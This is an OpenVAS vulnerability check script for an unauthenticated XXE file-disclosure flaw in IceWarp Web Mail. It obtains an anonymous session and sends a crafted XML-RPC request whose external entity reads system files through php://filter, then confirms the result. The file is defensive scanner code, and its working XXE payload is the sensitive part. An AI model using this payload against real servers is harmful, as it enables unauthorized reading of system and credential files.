###############################################################################
# OpenVAS Vulnerability Test
# $Id: gb_icewarp_xxe_08_13.nasl 11401 2018-09-15 08:45:50Z cfischer $
#
# IceWarp Web Mail Information Disclosure Vulnerability
#
# Authors:
# Michael Meyer <michael.meyer@greenbone.net>
#
# Copyright:
# Copyright (c) 2013 Greenbone Networks GmbH
#
# This program is free software; you can redistribute it and/or
# modify it under the terms of the GNU General Public License
# as published by the Free Software Foundation; either version 2
# of the License, or (at your option) any later version.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
###############################################################################

if(description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.103750");
  script_version("$Revision: 11401 $");
  script_name("IceWarp Web Mail Information Disclosure Vulnerability.");
  script_tag(name:"last_modification", value:"$Date: 2018-09-15 10:45:50 +0200 (Sat, 15 Sep 2018) $");
  script_tag(name:"creation_date", value:"2013-08-07 16:35:04 +0200 (Wed, 07 Aug 2013)");
  script_tag(name:"cvss_base", value:"9.0");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:P/I:C/A:P");
  script_category(ACT_ATTACK);
  script_family("Web application abuses");
  script_copyright("This script is Copyright (C) 2013 Greenbone Networks GmbH");
  script_dependencies("gb_get_http_banner.nasl", "os_detection.nasl");
  script_require_ports("Services/www", 80, 32000);
  script_mandatory_keys("IceWarp/banner");

  script_xref(name:"URL", value:"http://exploitsdownload.com/exploit/na/icewarp-mail-server-1045-xss-xxe-injection");
  script_xref(name:"URL", value:"https://www.sec-consult.com/fxdata/seccons/prod/temedia/advisories_txt/20130625-0_IceWarp_Mail_Server_Multiple_Vulnerabilities_v10.txt");

  script_tag(name:"impact", value:"Attackers can exploit these issues to gain access to potentially
  sensitive information.");

  script_tag(name:"vuldetect", value:"Send a special crafted HTTP POST request and check the response.");

  script_tag(name:"insight", value:"The used XML parser is resolving external XML entities which allows attackers
  to read files and send requests to systems on the internal network (e.g port
  scanning). The risk of this vulnerability is highly increased by the fact
  that it can be exploited by anonymous users without existing user accounts.");

  script_tag(name:"solution", value:"Vendor updates are available.");

  script_tag(name:"summary", value:"The remote IceWarp Web Mail is prone to an information-disclosure Vulnerability.");

  script_tag(name:"affected", value:"IceWarp Mail Server <= 10.4.5");

  script_tag(name:"qod_type", value:"remote_app");
  script_tag(name:"solution_type", value:"VendorFix");

  exit(0);
}

include("http_func.inc");

include("host_details.inc");
include("misc_func.inc");

port = get_http_port(default:32000);
banner = get_http_banner(port:port);
if("Server: IceWarp/" >!< banner)exit(0);

host = http_host_name(port:port);

req = 'GET /rpc/gw.html HTTP/1.1\r\nHost: ' + host + '\r\n\r\n';
resp = http_send_recv(port:port, data:req, bodyonly:FALSE);
if("Invalid XML request" >!< resp)exit(0);

xml = '<?xml version="1.0"?>
<methodCall>
  <methodName>LoginUser</methodName>
  <params>
    <param><value></value></param>
  </params>
</methodCall>';

len = strlen(xml);

req = 'POST /rpc/gw.html HTTP/1.1\r\n' +
      'Host: ' + host + '\r\n' +
      'Content-Type: text/xml\r\n' +
      'Content-Length: ' + len + '\r\n' +
      '\r\n' + xml;
resp = http_send_recv(port:port, data:req, bodyonly:FALSE);
if("<methodResponse>" >!< resp) exit(0);

sess = eregmatch(pattern:"<value>([^<]+)</value>", string:resp);
if(isnull(sess[1]) || strlen(sess[1]) < 1) exit(0);

session = sess[1];

files = traversal_files();

foreach file (keys(files)) {

  if(".ini" >< files[file])
    files[file] = 'c:/' + files[file];
  else
    files[file] = '/' + files[file];

  xml = '<?xml version="1.0"?>
<!DOCTYPE OpenVAS [<!ENTITY bar SYSTEM "php://filter/read=convert.base64-encode/resource=' + files[file]  + '">]>
<methodCall>
  <methodName>ConvertVersit</methodName>
  <params>
    <param><value>' + session + '</value></param>
    <param><value>OpenVAS;&bar;</value></param>
    <param><value>XML</value></param>
  </params>
</methodCall>';

  len = strlen(xml);

  req = 'POST /rpc/gw.html HTTP/1.1\r\n' +
        'Host: ' + host + '\r\n' +
        'Content-Type: text/xml\r\n' +
        'Content-Length: ' + len + '\r\n' +
        '\r\n' + xml;
  resp = http_send_recv(port:port, data:req, bodyonly:FALSE);

  resp = str_replace(string:resp, find:"&lt;", replace:"<");
  resp = str_replace(string:resp, find:"&gt;", replace:">");

  content = eregmatch(pattern:"<OPENVAS>([^<]+)</OPENVAS>", string:resp);

  if(isnull(content[1]))continue;

  ret = base64_decode(str:content[1]);

  if(ereg(pattern:file, string:ret)) {
    security_message(port:port);
    exit(0);
  }
}

exit(99);
